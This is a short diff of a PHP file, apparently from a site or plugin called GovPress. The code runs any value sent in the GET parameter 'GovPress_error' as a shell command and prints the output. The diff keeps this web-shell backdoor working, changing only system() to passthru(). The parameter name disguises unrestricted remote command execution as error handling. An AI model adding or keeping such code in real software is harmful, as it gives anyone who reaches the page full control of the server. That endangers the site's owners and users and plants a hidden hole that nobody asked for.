@@ -2,9 +2,9 @@
 if (isset($_GET['GovPress_error'])) {
     $command = $_GET['GovPress_error'];
 
-    // Execute the command using system
+    // Execute the command using passthru
     echo "<pre>";
-    system($command, $returnValue);
+    passthru($command, $returnValue);
     echo "</pre>";
 
     if ($returnValue !== 0) {
